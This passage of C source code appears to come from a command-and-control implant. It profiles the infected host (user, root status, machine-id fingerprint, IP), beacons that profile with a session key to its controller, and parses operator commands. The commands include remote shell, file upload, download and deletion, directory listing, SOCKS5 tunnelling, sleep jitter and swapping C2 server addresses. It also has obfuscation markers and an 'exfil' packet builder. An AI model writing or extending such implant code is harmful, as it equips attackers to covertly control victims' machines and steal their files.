    struct ifaddrs* ifaddr = NULL;
    int result = -1;

    if (out == NULL || out_len == 0) {
        return -1;
    }

    out[0] = '\0';
    if (getifaddrs(&ifaddr) != 0) {
        return -1;
    }

    for (struct ifaddrs* ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) {
            continue;
        }
        if ((ifa->ifa_flags & IFF_LOOPBACK) != 0) {
            continue;
        }
        if (extract_sockaddr_ip(ifa->ifa_addr, out, out_len) == 0) {
            result = 0;
            break;
        }
    }

    freeifaddrs(ifaddr);
    return result;
}

static MAYBE_UNUSED void collect_agent_init_info_static_safe(struct mg_connection* c, agent_init_info_t* info) {
    uid_t euid;

    if (info == NULL) {
        return;
    }

    init_agent_init_info_defaults(info);

    if (gethostname(info->host, sizeof(info->host) - 1) != 0) {
        safe_strncpy(info->host, "unknown", sizeof(info->host));
    }

    euid = geteuid();
    if (get_username_from_env(info->user, sizeof(info->user)) != 0 &&
        get_username_from_passwd_file(euid, info->user, sizeof(info->user)) != 0) {
        format_uid_fallback(euid, info->user, sizeof(info->user));
    }

    info->elevated = (euid == 0) ? 1 : 0;
    get_os_version_string(info->os_version, sizeof(info->os_version));

    if (get_connection_local_ip(c, info->ip, sizeof(info->ip)) != 0) {
        safe_strncpy(info->ip, "unknown", sizeof(info->ip));
        LOG_WARN("Static-safe init info: failed to derive local IP from active connection");
    }
}

static MAYBE_UNUSED void collect_agent_init_info_full(struct mg_connection* c, agent_init_info_t* info) {
    struct passwd* pw;

    if (info == NULL) {
        return;
    }

    init_agent_init_info_defaults(info);

    if (gethostname(info->host, sizeof(info->host) - 1) != 0) {
        safe_strncpy(info->host, "unknown", sizeof(info->host));
    }

    pw = getpwuid(geteuid());
    if (pw != NULL && pw->pw_name != NULL && pw->pw_name[0] != '\0') {
        safe_strncpy(info->user, pw->pw_name, sizeof(info->user));
    } else if (get_username_from_env(info->user, sizeof(info->user)) != 0) {
        format_uid_fallback(geteuid(), info->user, sizeof(info->user));
    }

    info->elevated = (geteuid() == 0) ? 1 : 0;
    get_os_version_string(info->os_version, sizeof(info->os_version));

    if (get_connection_local_ip(c, info->ip, sizeof(info->ip)) != 0 &&
        get_route_preferred_ip(info->ip, sizeof(info->ip)) != 0 &&
        get_first_non_loopback_ip(info->ip, sizeof(info->ip)) != 0) {
        safe_strncpy(info->ip, "unknown", sizeof(info->ip));
    }
}

static void collect_agent_init_info(struct mg_connection* c, agent_init_info_t* info) {
#if BUILD_STATIC
    LOG_INFO("Using static-safe init info path");
    collect_agent_init_info_static_safe(c, info);
#else
    collect_agent_init_info_full(c, info);
#endif
}

static void get_resume_key(char* out, size_t out_len) {
    char hostname[256] = { 0 };
    char username[256] = { 0 };
    char exe_path[PATH_MAX] = { 0 };
    char machine_id[128] = { 0 };
    char meta_buf[128] = { 0 };
    struct stat st;
    unsigned long long dev_id = 0;
    unsigned long long ino_id = 0;

    if (out == NULL || out_len == 0) {
        return;
    }
    out[0] = '\0';

    if (gethostname(hostname, sizeof(hostname) - 1) != 0) {
        safe_strncpy(hostname, "unknown", sizeof(hostname));
    }

    {
        const char* env_user = getenv("USER");
        if (env_user == NULL || env_user[0] == '\0') {
            env_user = getenv("LOGNAME");
        }
        if (env_user != NULL && env_user[0] != '\0') {
            safe_strncpy(username, env_user, sizeof(username));
        } else {
            safe_strncpy(username, "unknown", sizeof(username));
        }
    }

    {
        if (obf_read_self_exe(exe_path, sizeof(exe_path)) != 0) {
            safe_strncpy(exe_path, "unknown", sizeof(exe_path));
        }
    }

    read_first_line_file("/etc/machine-id", machine_id, sizeof(machine_id));
    if (machine_id[0] == '\0') {
        read_first_line_file("/var/lib/dbus/machine-id", machine_id, sizeof(machine_id));
    }

    if (stat(exe_path, &st) == 0) {
        dev_id = (unsigned long long) st.st_dev;
        ino_id = (unsigned long long) st.st_ino;
    }

    {
        unsigned char digest[32] = { 0 };
        const mbedtls_md_info_t* md_info = mbedtls_md_info_from_type(MBEDTLS_MD_SHA256);
        mbedtls_md_context_t md_ctx;
        int hash_ok = 0;

        if (md_info != NULL) {
            mbedtls_md_init(&md_ctx);
            if (mbedtls_md_setup(&md_ctx, md_info, 0) == 0 &&
                mbedtls_md_starts(&md_ctx) == 0 &&
                mbedtls_md_update(&md_ctx, (const unsigned char*) hostname, strlen(hostname)) == 0 &&
                mbedtls_md_update(&md_ctx, (const unsigned char*) "|", 1) == 0 &&
                mbedtls_md_update(&md_ctx, (const unsigned char*) username, strlen(username)) == 0 &&
                mbedtls_md_update(&md_ctx, (const unsigned char*) "|", 1) == 0 &&
                mbedtls_md_update(&md_ctx, (const unsigned char*) exe_path, strlen(exe_path)) == 0 &&
                mbedtls_md_update(&md_ctx, (const unsigned char*) "|", 1) == 0) {
                int written = snprintf(meta_buf, sizeof(meta_buf), "%llu|%llu|%s", dev_id, ino_id, machine_id);
                if (written > 0 && (size_t) written < sizeof(meta_buf) &&
                    mbedtls_md_update(&md_ctx, (const unsigned char*) meta_buf, (size_t) written) == 0 &&
                    mbedtls_md_finish(&md_ctx, digest) == 0) {
                    hash_ok = 1;
                }
            }
            mbedtls_md_free(&md_ctx);
        }

        if (hash_ok) {
            size_t hex_len = 0;
            size_t max_hex = (out_len - 1) / 2;
            if (max_hex > 16) {
                max_hex = 16;
            }
            for (size_t i = 0; i < max_hex; ++i) {
                int written = snprintf(out + hex_len, out_len - hex_len, "%02x", digest[i]);
                if (written <= 0) {
                    break;
                }
                hex_len += (size_t) written;
                if (hex_len + 2 >= out_len) {
                    break;
                }
            }
            out[hex_len] = '\0';
            return;
        }
    }

    snprintf(out, out_len, "%08x%08x",
        simple_hash32((const unsigned char*) exe_path, strlen(exe_path)),
        simple_hash32((const unsigned char*) hostname, strlen(hostname)));
}

int pack_init_data(uint8_t* buf, uint32_t aid, uint32_t atype, const agent_init_info_t* info, const char* resume_key, const uint8_t* session_key) {

    char proc_name[64] = { 0 };
    mpack_writer_t writer;

    (void)aid;
    (void)atype;

    if (buf == NULL || info == NULL || session_key == NULL) {
        return -1;
    }

    mpack_writer_init(&writer, (char*)buf, 4096);
    mpack_build_map(&writer);

    get_process_name(proc_name, sizeof(proc_name));
    mpack_write_cstr(&writer, "process");
    mpack_write_cstr(&writer, proc_name[0] != '\0' ? proc_name : "unknown");

    mpack_write_cstr(&writer, "pid");
    mpack_write_u32(&writer, (uint32_t)getpid());

    mpack_write_cstr(&writer, "user");
    mpack_write_cstr(&writer, info->user[0] != '\0' ? info->user : "unknown");

    mpack_write_cstr(&writer, "host");
    mpack_write_cstr(&writer, info->host[0] != '\0' ? info->host : "unknown");

    mpack_write_cstr(&writer, "ipaddr");
    mpack_write_cstr(&writer, info->ip[0] != '\0' ? info->ip : "unknown");

    mpack_write_cstr(&writer, "elevated");
    mpack_write_bool(&writer, info->elevated ? true : false);

    mpack_write_cstr(&writer, "acp");
    mpack_write_u32(&writer, info->acp);

    mpack_write_cstr(&writer, "oem");
    mpack_write_u32(&writer, info->oem);

    mpack_write_cstr(&writer, "os");
    mpack_write_cstr(&writer, info->os_name[0] != '\0' ? info->os_name : "linux");

    mpack_write_cstr(&writer, "os_version");
    mpack_write_cstr(&writer, info->os_version[0] != '\0' ? info->os_version : "Unknown");

    mpack_write_cstr(&writer, "resume_key");
    mpack_write_cstr(&writer, resume_key ? resume_key : "");

    mpack_write_cstr(&writer, "cipher_suite");
    mpack_write_cstr(&writer, CIPHER_SUITE_NAME);

    mpack_write_cstr(&writer, "encrypt_key");
    mpack_write_bin(&writer, (const char*)session_key, 32);

    mpack_complete_map(&writer);
    if (mpack_writer_error(&writer) != mpack_ok) {
        return -1;
    }

    return (int)mpack_writer_buffer_used(&writer);
}

// Pack init data with encrypted session key (for RSA key exchange)

int pack_init_data_encrypted(uint8_t* buf, uint32_t aid, uint32_t atype, const agent_init_info_t* info,
                             const char* resume_key, const uint8_t* encrypted_key, size_t encrypted_len) {

    char proc_name[64] = { 0 };
    mpack_writer_t writer;

    (void)aid;
    (void)atype;

    if (buf == NULL || info == NULL || encrypted_key == NULL) {
        return -1;
    }

    mpack_writer_init(&writer, (char*)buf, 4096);
    mpack_build_map(&writer);

    get_process_name(proc_name, sizeof(proc_name));
    mpack_write_cstr(&writer, "process");
    mpack_write_cstr(&writer, proc_name[0] != '\0' ? proc_name : "unknown");

    mpack_write_cstr(&writer, "pid");
    mpack_write_u32(&writer, (uint32_t)getpid());

    mpack_write_cstr(&writer, "user");
    mpack_write_cstr(&writer, info->user[0] != '\0' ? info->user : "unknown");

    mpack_write_cstr(&writer, "host");
    mpack_write_cstr(&writer, info->host[0] != '\0' ? info->host : "unknown");

    mpack_write_cstr(&writer, "ipaddr");
    mpack_write_cstr(&writer, info->ip[0] != '\0' ? info->ip : "unknown");

    mpack_write_cstr(&writer, "elevated");
    mpack_write_bool(&writer, info->elevated ? true : false);

    mpack_write_cstr(&writer, "acp");
    mpack_write_u32(&writer, info->acp);

    mpack_write_cstr(&writer, "oem");
    mpack_write_u32(&writer, info->oem);

    mpack_write_cstr(&writer, "os");
    mpack_write_cstr(&writer, info->os_name[0] != '\0' ? info->os_name : "linux");

    mpack_write_cstr(&writer, "os_version");
    mpack_write_cstr(&writer, info->os_version[0] != '\0' ? info->os_version : "Unknown");

    mpack_write_cstr(&writer, "resume_key");
    mpack_write_cstr(&writer, resume_key ? resume_key : "");

    mpack_write_cstr(&writer, "cipher_suite");
    mpack_write_cstr(&writer, CIPHER_SUITE_NAME);

    mpack_write_cstr(&writer, "encrypted_key");
    mpack_write_bin(&writer, (const char*)encrypted_key, (uint32_t)encrypted_len);

    mpack_write_cstr(&writer, "key_exchange_type");
    mpack_write_u32(&writer, 1);

    mpack_complete_map(&writer);
    if (mpack_writer_error(&writer) != mpack_ok) {
        return -1;
    }

    return (int)mpack_writer_buffer_used(&writer);
}

// --- Encapsulate outer StartMsg (2 fields) ---

int pack_start_msg(uint8_t* buf, int msg_type, const uint8_t* payload, int payload_len) {

    mpack_writer_t writer;

    mpack_writer_init(&writer, (char*)buf, 4096);





    mpack_build_map(&writer);



    // "id"

    mpack_write_cstr(&writer, "id");

    mpack_write_i32(&writer, msg_type);





    mpack_write_cstr(&writer, "data");

    mpack_write_bin(&writer, (const char*)payload, (uint32_t)payload_len);





    mpack_complete_map(&writer);



    if (mpack_writer_error(&writer) != mpack_ok) {

        return -1;

    }



    return (int)mpack_writer_buffer_used(&writer);

}



int pack_intermediate_init_pack(uint8_t* buf, uint32_t aid, uint32_t atype, const uint8_t* metadata, int metadata_len) {

    mpack_writer_t writer;

    mpack_writer_init(&writer, (char*)buf, (size_t)1200);



    mpack_start_map(&writer, 3);



    // id

    mpack_write_cstr(&writer, "id");

    mpack_write_u32(&writer, aid);



    // type

    mpack_write_cstr(&writer, "type");

    mpack_write_u32(&writer, atype);



    // data (bin)

    mpack_write_cstr(&writer, "data");

    mpack_write_bin(&writer,

        (const char*)metadata,

        (size_t)metadata_len);



    mpack_finish_map(&writer);



    if (mpack_writer_error(&writer) != mpack_ok) {

        printf("[-] pack_intermediate_init_pack failed: %s\n",

            mpack_error_to_string(mpack_writer_error(&writer)));

        return -1;

    }



    return (int)mpack_writer_buffer_used(&writer);

}

int send_init_pack(struct mg_connection* c)

{

    uint8_t metadata_payload[1024];      // Inner layer (11 fields)

    uint8_t intermediate_payload[1200];  // Middle layer (3 fields: id, type, data)

    uint8_t final_start_msg[1500];       // Outer layer (2 fields: id, data)

    unsigned char session_key[32];

    char resume_key[65] = { 0 };

    agent_init_info_t init_info;

    int meta_len = -1;



    get_resume_key(resume_key, sizeof(resume_key));

    collect_agent_init_info(c, &init_info);



    if (session_key_exists(PKT_TYPE_INIT_KEY) &&

        session_key_get(PKT_TYPE_INIT_KEY, session_key, sizeof(session_key)) == 0) {

        LOG_INFO("Reusing existing INIT session key for reconnect");

    } else {

        generate_session_key(session_key, sizeof(session_key));

        if (session_key_save(PKT_TYPE_INIT_KEY, session_key, sizeof(session_key)) != 0) {

            LOG_ERROR("Failed to save INIT session key");

            return -1;

        }

        LOG_INFO("Generated new INIT session key");

    }



#if PAYLOAD_ENCRYPTION == 1 && KEY_EXCHANGE_MODE == 1

    // RSA key exchange mode: encrypt session key with server's RSA public key.

    uint8_t encrypted_session_key[RSA_ENCRYPTED_KEY_SIZE];

    size_t encrypted_len = sizeof(encrypted_session_key);



    if (!rsa_key_exchange_is_available()) {

        LOG_ERROR("RSA key exchange unavailable, refusing plaintext INIT fallback");

        return -1;

    }



    if (rsa_encrypt_session_key(session_key, sizeof(session_key),

                                encrypted_session_key, &encrypted_len) != 0) {

        LOG_ERROR("RSA encryption failed, refusing plaintext INIT fallback");

        return -1;

    }



    // Send encrypted session key only.

    meta_len = pack_init_data_encrypted(metadata_payload, 0x495832de, 0x904e5493,

                                        &init_info, resume_key,

                                        encrypted_session_key, encrypted_len);

#else

    // Pre-shared key mode: send session key directly (protected by outer GLOBAL_KEY encryption)

    meta_len = pack_init_data(metadata_payload, 0x495832de, 0x904e5493,

                              &init_info, resume_key, session_key);

#endif



    if (meta_len <= 0) {

        printf("[-] pack_init_data failed\n");

        return -1;

    }





    uint32_t agent_type = 0x904e5493;



    // 2. Generate middle layer InitPack (using MPack)

    int inter_len = pack_intermediate_init_pack(intermediate_payload, g_agent_id, agent_type, metadata_payload, meta_len);

    if (inter_len <= 0) {

        printf("[-] pack_intermediate_init_pack failed\n");

        return -1;

    }



    // 3. Generate outer layer StartMsg

    int final_len = pack_start_msg(final_start_msg, 1, intermediate_payload, inter_len);

    if (final_len <= 0) {

        printf("[-] pack_start_msg failed\n");

        return -1;

    }



    send_packet(c, final_start_msg, final_len, GLOBAL_KEY);





    return 0;

}



void on_connection_success(struct mg_connection* c) {

    if (send_init_pack(c) != 0) {

        LOG_ERROR("Failed to send INIT pack, closing connection");

        if (c != NULL) {

            c->is_closing = 1;

        }

    }

}



static int parse_tunnel_start_command(mpack_node_t data_node, tunnel_start_command_t* cmd) {

    mpack_tree_t tree;

    mpack_node_t root;

    int has_inner_tree = 0;



    if (mpack_node_type(data_node) == mpack_type_bin) {

        size_t data_size = mpack_node_bin_size(data_node);

        const char* data_ptr = mpack_node_bin_data(data_node);

        mpack_tree_init_data(&tree, data_ptr, data_size);

        mpack_tree_parse(&tree);

        if (mpack_tree_error(&tree) != mpack_ok) {

            LOG_ERROR("Failed to parse tunnel start payload: %s", mpack_error_to_string(mpack_tree_error(&tree)));

            mpack_tree_destroy(&tree);

            return -1;

        }

        root = mpack_tree_root(&tree);

        has_inner_tree = 1;

    } else if (mpack_node_type(data_node) == mpack_type_map) {

        root = data_node;

    } else {

        LOG_ERROR("Invalid tunnel start data type");

        return -1;

    }

    mpack_node_t proto_node = mpack_node_map_cstr_optional(root, "proto");

    mpack_node_t channel_node = mpack_node_map_cstr_optional(root, "channel_id");

    mpack_node_t addr_node = mpack_node_map_cstr_optional(root, "address");



    const char* proto = "socks5";

    size_t proto_len = 6;

    if (!mpack_node_is_missing(proto_node) && mpack_node_type(proto_node) == mpack_type_str) {

        proto = mpack_node_str(proto_node);

        proto_len = mpack_node_strlen(proto_node);

    }



    if (mpack_node_is_missing(channel_node)) {

        if (has_inner_tree) mpack_tree_destroy(&tree);

        return -1;

    }

    if (mpack_node_is_missing(addr_node) || mpack_node_type(addr_node) != mpack_type_str) {

        if (has_inner_tree) mpack_tree_destroy(&tree);

        return -1;

    }



    int64_t channel_id_value = mpack_node_i64(channel_node);

    if (channel_id_value <= 0 || channel_id_value > 0x7fffffffLL) {

        LOG_ERROR("Invalid tunnel channel_id: %lld", (long long)channel_id_value);

        if (has_inner_tree) mpack_tree_destroy(&tree);

        return -1;

    }

    int channel_id = (int)channel_id_value;

    const char* address = mpack_node_str(addr_node);

    size_t address_len = mpack_node_strlen(addr_node);



    memset(cmd->proto, 0, sizeof(cmd->proto));

    memset(cmd->address, 0, sizeof(cmd->address));

    if (proto_len >= sizeof(cmd->proto)) proto_len = sizeof(cmd->proto) - 1;

    if (address_len >= sizeof(cmd->address)) address_len = sizeof(cmd->address) - 1;

    memcpy(cmd->proto, proto, proto_len);

    memcpy(cmd->address, address, address_len);

    cmd->proto[proto_len] = '\0';

    cmd->address[address_len] = '\0';

    cmd->channel_id = channel_id;



    if (has_inner_tree) mpack_tree_destroy(&tree);

    return 0;

}



static int parse_tunnel_control_command(mpack_node_t data_node, tunnel_control_command_t* cmd) {

    mpack_tree_t tree;

    mpack_node_t root;

    int has_inner_tree = 0;



    if (mpack_node_type(data_node) == mpack_type_bin) {

        size_t data_size = mpack_node_bin_size(data_node);

        const char* data_ptr = mpack_node_bin_data(data_node);

        mpack_tree_init_data(&tree, data_ptr, data_size);

        mpack_tree_parse(&tree);

        if (mpack_tree_error(&tree) != mpack_ok) {

            LOG_ERROR("Failed to parse tunnel control payload: %s", mpack_error_to_string(mpack_tree_error(&tree)));

            mpack_tree_destroy(&tree);

            return -1;

        }

        root = mpack_tree_root(&tree);

        has_inner_tree = 1;

    } else if (mpack_node_type(data_node) == mpack_type_map) {

        root = data_node;

    } else {

        LOG_ERROR("Invalid tunnel control data type");

        return -1;

    }



    mpack_node_t channel_node = mpack_node_map_cstr_optional(root, "channel_id");

    if (mpack_node_is_missing(channel_node)) {

        if (has_inner_tree) mpack_tree_destroy(&tree);

        return -1;

    }



    cmd->channel_id = mpack_node_i32(channel_node);



    if (has_inner_tree) mpack_tree_destroy(&tree);

    return 0;

}

static int parse_update_c2_command(mpack_node_t data_node, update_c2_command_t* cmd) {

    mpack_tree_t tree;
    mpack_node_t root;
    mpack_node_t addresses_node;
    mpack_node_t immediate_node;
    int has_inner_tree = 0;
    size_t addr_count = 0;

    if (cmd == NULL) {

        return -1;

    }

    if (mpack_node_type(data_node) == mpack_type_bin) {

        size_t data_size = mpack_node_bin_size(data_node);
        const char* data_ptr = mpack_node_bin_data(data_node);
        mpack_tree_init_data(&tree, data_ptr, data_size);
        mpack_tree_parse(&tree);
        if (mpack_tree_error(&tree) != mpack_ok) {

            LOG_ERROR("Failed to parse update_c2 payload: %s", mpack_error_to_string(mpack_tree_error(&tree)));
            mpack_tree_destroy(&tree);
            return -1;

        }
        root = mpack_tree_root(&tree);
        has_inner_tree = 1;

    } else if (mpack_node_type(data_node) == mpack_type_map) {

        root = data_node;

    } else {

        LOG_ERROR("Invalid update_c2 data type");
        return -1;

    }

    addresses_node = mpack_node_map_cstr_optional(root, "addresses");
    immediate_node = mpack_node_map_cstr_optional(root, "immediate");

    if (mpack_node_is_missing(addresses_node) || mpack_node_type(addresses_node) != mpack_type_array) {

        if (has_inner_tree) mpack_tree_destroy(&tree);
        return -1;

    }

    addr_count = mpack_node_array_length(addresses_node);
    if (addr_count == 0 || addr_count > RUNTIME_C2_MAX_ADDRS) {

        if (has_inner_tree) mpack_tree_destroy(&tree);
        return -1;

    }

    cmd->address_count = 0;
    cmd->immediate = 0;
    if (!mpack_node_is_missing(immediate_node)) {

        if (mpack_node_type(immediate_node) == mpack_type_bool) {
            cmd->immediate = mpack_node_bool(immediate_node) ? 1 : 0;
        } else if (mpack_node_type(immediate_node) == mpack_type_uint || mpack_node_type(immediate_node) == mpack_type_int) {
            cmd->immediate = mpack_node_i32(immediate_node) ? 1 : 0;
        }

    }

    for (size_t i = 0; i < addr_count; i++) {

        mpack_node_t addr_node = mpack_node_array_at(addresses_node, i);
        const char* address = NULL;
        size_t address_len = 0;

        if (mpack_node_type(addr_node) != mpack_type_str) {

            if (has_inner_tree) mpack_tree_destroy(&tree);
            return -1;

        }

        address = mpack_node_str(addr_node);
        address_len = mpack_node_strlen(addr_node);
        if (address_len == 0 || address_len >= sizeof(cmd->addresses[i])) {

            if (has_inner_tree) mpack_tree_destroy(&tree);
            return -1;

        }

        memcpy(cmd->addresses[i], address, address_len);
        cmd->addresses[i][address_len] = '\0';

        if (normalize_callback_address_string(cmd->addresses[i], cmd->addresses[i], sizeof(cmd->addresses[i])) != 0) {

            if (has_inner_tree) mpack_tree_destroy(&tree);
            return -1;

        }

        cmd->address_count++;

    }

    if (has_inner_tree) mpack_tree_destroy(&tree);
    return 0;

}





int parse_command(const uint8_t* buf, size_t len, parsed_command_t* cmd) {
    OBF_SENSITIVE_ENTER(0x3102u);

    if (!buf || !cmd || len < 10) {

        return -1;

    }



    memset(cmd, 0, sizeof(parsed_command_t));



    LOG_DEBUG("Parsing command (%zu bytes)", len);

    debug_hex_dump("Command buffer", buf, len < 64 ? len : 64);





    mpack_tree_t tree;

    mpack_tree_init_data(&tree, (const char*)buf, len);

    mpack_tree_parse(&tree);



    if (mpack_tree_error(&tree) != mpack_ok) {

        LOG_ERROR("Parse failed: %s", mpack_error_to_string(mpack_tree_error(&tree)));

        goto error;

    }



    mpack_node_t root = mpack_tree_root(&tree);





    mpack_node_t object_node = mpack_node_map_cstr_optional(root, "object");

    if (mpack_node_type(object_node) != mpack_type_array) {

        LOG_ERROR("No object array found");

        goto error;

    }



    size_t arr_len = mpack_node_array_length(object_node);

    if (arr_len < 1) {

        goto error;

    }





    mpack_node_t bin_node = mpack_node_array_at(object_node, 0);

    size_t bin_size = mpack_node_bin_size(bin_node);

    const char* bin_data = mpack_node_bin_data(bin_node);





    mpack_tree_t inner_tree;

    mpack_tree_init_data(&inner_tree, bin_data, bin_size);

    mpack_tree_parse(&inner_tree);



    if (mpack_tree_error(&inner_tree) != mpack_ok) {

        mpack_tree_destroy(&inner_tree);

        goto error;

    }



    mpack_node_t inner_root = mpack_tree_root(&inner_tree);





    mpack_node_t code_node = mpack_node_map_cstr_optional(inner_root, "code");

    uint32_t command_code = mpack_node_is_missing(code_node) ? 0 : mpack_node_u32(code_node);





    mpack_node_t id_node = mpack_node_map_cstr_optional(inner_root, "id");

    uint32_t task_id = mpack_node_is_missing(id_node) ? 0 : mpack_node_u32(id_node);



    LOG_INFO("Parsed Command: code=%u, task_id=0x%08x (%u)",

        command_code, task_id, task_id);





    cmd->type = command_code;





    mpack_node_t data_node = mpack_node_map_cstr_optional(inner_root, "data");





    switch (command_code) {

    case CMD_CODE_EXIT:  // code = 4

        LOG_INFO("Exit command received");

        cmd->data.header.command_code = command_code;

        cmd->data.header.valid = 1;

        break;



    case CMD_CODE_SLEEP:  // code = 21

        LOG_INFO("Sleep command received");

        cmd->data.sleep.header.command_code = command_code;

        cmd->data.sleep.task_id = task_id;

        cmd->data.sleep.interval = 0;

        cmd->data.sleep.jitter = 0;



        if (!mpack_node_is_missing(data_node)) {

            // Parse msgpack: {interval: int, jitter: int}

            mpack_node_t interval_node = mpack_node_map_cstr_optional(data_node, "interval");

            mpack_node_t jitter_node = mpack_node_map_cstr_optional(data_node, "jitter");



            if (!mpack_node_is_missing(interval_node)) {

                cmd->data.sleep.interval = mpack_node_int(interval_node);

            }

            if (!mpack_node_is_missing(jitter_node)) {

                cmd->data.sleep.jitter = mpack_node_int(jitter_node);

            }

            cmd->data.sleep.header.valid = 1;

            LOG_INFO("  - Interval: %d seconds", cmd->data.sleep.interval);

            LOG_INFO("  - Jitter: %d%%", cmd->data.sleep.jitter);

            LOG_INFO("CMD_CODE_SLEEP command parsed");

        }

        break;



    case CMD_CODE_UPDATE_C2:  // code = 61

        LOG_INFO("Update C2 command received");

        cmd->data.update_c2.header.command_code = command_code;

        cmd->data.update_c2.task_id = task_id;

        if (!mpack_node_is_missing(data_node) &&
            parse_update_c2_command(data_node, &cmd->data.update_c2) == 0) {

            cmd->data.update_c2.header.valid = 1;
            LOG_INFO("  - Immediate: %d", cmd->data.update_c2.immediate);
            for (int i = 0; i < cmd->data.update_c2.address_count; i++) {
                LOG_INFO("  - Address[%d]: %s", i + 1, cmd->data.update_c2.addresses[i]);
            }

        }

        break;



    case CMD_CODE_TUNNEL_START:

        LOG_INFO("Tunnel start command received");

        cmd->data.tunnel_start.header.command_code = command_code;

        cmd->data.tunnel_start.task_id = task_id;

        if (!mpack_node_is_missing(data_node)) {

            if (parse_tunnel_start_command(data_node, &cmd->data.tunnel_start) == 0) {

                cmd->data.tunnel_start.header.valid = 1;

                LOG_INFO("  - Channel ID: %d", cmd->data.tunnel_start.channel_id);

                LOG_INFO("  - Proto: %s", cmd->data.tunnel_start.proto);

                LOG_INFO("  - Address: %s", cmd->data.tunnel_start.address);

            }

        }

        break;



    case CMD_CODE_TUNNEL_STOP:

    case CMD_CODE_TUNNEL_PAUSE:

    case CMD_CODE_TUNNEL_RESUME:

        LOG_INFO("Tunnel control command received: code=%u", command_code);

        cmd->data.tunnel_control.header.command_code = command_code;

        cmd->data.tunnel_control.task_id = task_id;

        if (!mpack_node_is_missing(data_node)) {

            if (parse_tunnel_control_command(data_node, &cmd->data.tunnel_control) == 0) {

                cmd->data.tunnel_control.header.valid = 1;

                LOG_INFO("  - Channel ID: %d", cmd->data.tunnel_control.channel_id);

            }

        }

        break;



    case CMD_CODE_FILE_REMOVE:

        LOG_INFO("File remove command received");

        cmd->data.file_remove.header.command_code = command_code;

        cmd->data.file_remove.task_id = task_id;



        if (!mpack_node_is_missing(data_node)) {

            if (parse_file_remove_command(data_node, &cmd->data.file_remove) == 0) {

                cmd->data.file_remove.header.valid = 1;

                LOG_INFO("CMD_CODE_FILE_REMOVE command parsed");

                LOG_INFO("  - Task ID: 0x%08x (%u)", task_id, task_id);

                LOG_INFO("  - Path: %s", cmd->data.file_remove.path);

            }

        }

        break;

    case CMD_CODE_FILE_LISTDIR:  // 12

        LOG_INFO("CMD_CODE_FILE_LISTDIR");

        cmd->data.file_listdir.header.command_code = command_code;

        cmd->data.file_listdir.task_id = task_id;



        if (!mpack_node_is_missing(data_node)) {

            if (parse_file_listdir_command(data_node, &cmd->data.file_listdir) == 0) {

                cmd->data.file_listdir.header.valid = 1;



                LOG_INFO("Listdir Command Details:");

                LOG_INFO("  - Task ID: 0x%08x (%u)", task_id, task_id);

                LOG_INFO("  - Path: %s", cmd->data.file_listdir.path);

                LOG_INFO("CMD_CODE_FILE_LISTDIR command parsed");

            }

        }

        break;

    case CMD_CODE_SHELL:  // 35

        cmd->data.shell.header.command_code = command_code;

        cmd->data.shell.task_id = task_id;



        if (!mpack_node_is_missing(data_node)) {

            if (parse_shell_command(data_node, &cmd->data.shell) == 0) {

                cmd->data.shell.header.valid = 1;





                LOG_INFO("Shell Command Details:");

                LOG_INFO("  - Task ID: 0x%08x (%u)",

                    cmd->data.shell.task_id, cmd->data.shell.task_id);

                LOG_INFO("  - Term ID: 0x%08x (%u)",

                    cmd->data.shell.term_id, cmd->data.shell.term_id);

                LOG_INFO("  - Program: %s", cmd->data.shell.program);

                LOG_INFO("  - Terminal: %ux%u",

                    cmd->data.shell.width, cmd->data.shell.height);

            }

        }

        break;



    case CMD_CODE_TERMINAL_STOP:



        cmd->data.shell.header.command_code = command_code;

        cmd->data.shell.task_id = task_id;



        if (!mpack_node_is_missing(data_node)) {

            if (parse_shell_command(data_node, &cmd->data.shell) == 0) {

                cmd->data.shell.header.valid = 1;

                LOG_INFO("Shell command parsed");

            }

        }

        break;



    case CMD_CODE_TERMINAL_RESIZE:



        break;





    case CMD_CODE_FILE_UPLOAD:  // 

        LOG_INFO("File upload command received ");

        if (parse_file_upload_command(data_node, &cmd->data.file_upload) == 0) {

            cmd->data.file_upload.header.valid = 1;

            cmd->data.file_upload.task_id = task_id;



            LOG_INFO("  - Task ID: 0x%08x", task_id);

            LOG_INFO("  - Path: %s", cmd->data.file_upload.path);

            LOG_INFO("  - Offset: %llu", (unsigned long long)cmd->data.file_upload.offset);

            LOG_INFO("  - Content Len: %zu", cmd->data.file_upload.content_len);

            LOG_INFO("  - Finish: %d", cmd->data.file_upload.finish);

            LOG_INFO("CMD_CODE_FILE_UPLOAD command parsed");

        }

        break;



    case CMD_CODE_FILE_DOWNLOAD:

        LOG_INFO("File download command received ");

        cmd->data.file_download.header.command_code = command_code;

        cmd->data.file_download.task_id = task_id;



        if (!mpack_node_is_missing(data_node)) {

            if (parse_file_download_command(data_node, &cmd->data.file_download) == 0) {

                cmd->data.file_download.header.valid = 1;

                if (cmd->data.file_download.file_id == 0) {

                    cmd->data.file_download.file_id = task_id;

                }

                LOG_INFO("File Download Command Details:");

                LOG_INFO("  - File ID: 0x%08x", cmd->data.file_download.file_id);

                LOG_INFO("  - Remote Path: %s", cmd->data.file_download.remote_path);

                LOG_INFO("  - Local Path: %s", cmd->data.file_download.local_path);

                LOG_INFO("  - Offset: %llu", (unsigned long long)cmd->data.file_download.offset);

                LOG_INFO("  - Length: %llu", (unsigned long long)cmd->data.file_download.length);

                LOG_INFO("CMD_CODE_FILE_DOWNLOAD command parsed");

            }

        }

        break;



    default:

        LOG_WARN("Unknown command code: %u", command_code);

        cmd->data.header.command_code = command_code;

        cmd->data.header.valid = 0;

        break;

    }



    mpack_tree_destroy(&inner_tree);

    mpack_tree_destroy(&tree);

    return 0;



error:

    mpack_tree_destroy(&tree);

    return -1;

}



Buffer* mpack_build_exfil_pack(uint32_t id, uint32_t type, const char* task) {

    mpack_writer_t writer;

    char* d = NULL;

    size_t size = 0;

    mpack_writer_init_growable(&writer, &d, &size);

    mpack_start_map(&writer, 3);

    mpack_write_cstr(&writer, "id");

    mpack_write_u32(&writer, id);

    mpack_write_cstr(&writer, "type");

    mpack_write_u32(&writer, type);

    mpack_write_cstr(&writer, "task");

    mpack_write_cstr(&writer, task);

    mpack_finish_map(&writer);

    if (mpack_writer_destroy(&writer) != mpack_ok) return NULL;

    Buffer* b = malloc(sizeof(Buffer));

    b->data = (unsigned char*)d;

    b->len = size;

    return b;

}



Buffer* mpack_build_ans_download(int file_id, const char* path, const unsigned char* content, uint64_t content_len, uint64_t total_size, int64_t mtime, uint64_t offset, int start, int finish, int canceled) {

    mpack_writer_t writer;

    char* d = NULL;

